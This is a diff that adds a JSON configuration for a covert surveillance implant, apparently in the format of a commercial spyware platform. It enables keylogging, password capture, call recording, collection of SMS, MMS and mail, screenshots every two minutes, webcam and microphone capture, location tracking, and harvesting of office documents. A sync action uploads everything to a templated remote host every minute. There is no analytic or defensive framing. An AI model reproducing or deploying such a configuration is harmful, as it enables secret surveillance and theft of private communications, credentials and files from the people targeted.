@@ -1,0 +1,199 @@
+{
+    "modules": [
+        {"module": "addressbook"},
+        {"module": "application"},
+        {"module": "calendar"},
+        {"compression": 5, "module": "call", "record": true, "buffer": 512000},
+        {"quality": "med", "module": "camera"},
+        {"module": "chat"},
+        {"module": "clipboard"},
+        {
+            "camera": true,
+            "hook": {"enabled": true, "processes": []},
+            "synchronize": false,
+            "module": "crisis",
+            "position": true,
+            "network": {"enabled": false, "processes": []},
+            "mic": true,
+            "call": true
+        },
+        {"list": false, "module": "device"},
+        {
+            "minsize": 1,
+            "deny": [
+                "*\\AppData\\Local*",
+                "*\\AppData\\Roaming*",
+                "*\\Skype\\Plugins\\*",
+                "*\\$RECYCLE.BIN\\*",
+                "*:\\Windows\\*",
+                "*.dll",
+                "*.exe",
+                "*.ini",
+                "*.lnk",
+                "*.ico",
+                "*.tlb",
+                "*.clb",
+                "*.dat",
+                "*.drv",
+                "*.ocx",
+                "*.url",
+                "\\\\.\\*"
+            ],
+            "date": "2013-03-04 00:00:00",
+            "module": "file",
+            "open": false,
+            "accept": [
+                "*.doc",
+                "*.docx",
+                "*.xls",
+                "*.xlsx",
+                "*.ppt",
+                "*.pptx",
+                "*.pps",
+                "*.ppsx",
+                "*.odt",
+                "*.ods",
+                "*.odp",
+                "*.rtf",
+                "*.txt",
+                "*.pdf"
+            ],
+            "maxsize": 500000,
+            "capture": true
+        },
+        {"factory": "", "module": "infection", "usb": false, "vm": 0, "mobile": false, "local": false},
+        {"module": "keylog"},
+        {
+            "sms": {
+                "enabled": true,
+                "filter": {"history": true, "datefrom": "2013-03-04 00:00:00", "dateto": "2100-01-01 00:00:00"}
+            },
+            "mms": {
+                "enabled": true,
+                "filter": {"history": true, "datefrom": "2013-03-04 00:00:00", "dateto": "2100-01-01 00:00:00"}
+            },
+            "module": "messages",
+            "mail": {
+                "enabled": true,
+                "filter": {
+                    "history": true,
+                    "datefrom": "2013-03-04 00:00:00",
+                    "maxsize": 100000,
+                    "dateto": "2100-01-01 00:00:00"
+                }
+            }
+        },
+        {"silence": 5, "module": "mic", "autosense": false, "threshold": 0.22},
+        {"width": 50, "module": "mouse", "height": 50},
+        {"module": "password"},
+        {"wifi": true, "module": "position", "gps": false, "cell": true},
+        {"quality": "med", "onlywindow": false, "module": "screenshot"},
+        {"module": "url"}
+    ],
+    "events": [
+        {
+            "start": 0,
+            "te": "23:59:59",
+            "enabled": true,
+            "ts": "00:00:00",
+            "desc": "STARTUP",
+            "subtype": "loop",
+            "event": "timer"
+        },
+        {
+            "start": 1,
+            "te": "23:59:59",
+            "enabled": true,
+            "ts": "00:00:00",
+            "event": "timer",
+            "desc": "SCREENSHOT",
+            "subtype": "loop",
+            "delay": 120,
+            "repeat": 1
+        },
+        {
+            "start": 2,
+            "iter": 1,
+            "te": "23:59:59",
+            "enabled": true,
+            "ts": "00:00:00",
+            "event": "timer",
+            "desc": "CAMERA",
+            "subtype": "loop",
+            "delay": 120,
+            "repeat": 2
+        },
+        {
+            "start": 3,
+            "te": "23:59:59",
+            "enabled": true,
+            "ts": "00:00:00",
+            "event": "timer",
+            "desc": "POSITION",
+            "subtype": "loop",
+            "delay": 900,
+            "repeat": 3
+        },
+        {
+            "event": "timer",
+            "te": "23:59:59",
+            "enabled": true,
+            "ts": "00:00:00",
+            "desc": "SYNC",
+            "subtype": "loop",
+            "delay": 60,
+            "repeat": 4,
+            "start": 4
+        }
+    ],
+    "globals": {
+        "nohide": [],
+        "quota": {"min": 1048576, "max": 4194304000},
+        "wipe": false,
+        "migrated": false,
+        "advanced": false,
+        "remove_driver": true,
+        "type": "desktop",
+        "version": 2012041601,
+        "collapsed": false
+    },
+    "actions": [
+        {
+            "subactions": [
+                {"action": "module", "module": "device", "status": "start"},
+                {"action": "module", "module": "call", "status": "start"},
+                {"action": "module", "module": "calendar", "status": "start"},
+                {"action": "module", "module": "addressbook", "status": "start"},
+                {"action": "module", "module": "messages", "status": "start"},
+                {"action": "module", "module": "chat", "status": "start"},
+                {"action": "module", "module": "url", "status": "start"},
+                {"action": "module", "module": "keylog", "status": "start"},
+                {"action": "module", "module": "mouse", "status": "start"},
+                {"action": "module", "module": "password", "status": "start"},
+                {"action": "module", "module": "file", "status": "start"}
+            ],
+            "desc": "STARTUP"
+        },
+        {
+            "subactions": [{"action": "module", "module": "screenshot", "status": "start"}],
+            "desc": "SCREENSHOT"
+        },
+        {"subactions": [{"action": "module", "module": "camera", "status": "start"}], "desc": "CAMERA"},
+        {"subactions": [{"action": "module", "module": "position", "status": "start"}], "desc": "POSITION"},
+        {
+            "subactions": [
+                {
+                    "host": "$(HOSTNAME)",
+                    "wifi": true,
+                    "maxdelay": 0,
+                    "stop": false,
+                    "mindelay": 0,
+                    "action": "synchronize",
+                    "cell": false,
+                    "bandwidth": 500000
+                }
+            ],
+            "desc": "SYNC"
+        }
+    ]
+}
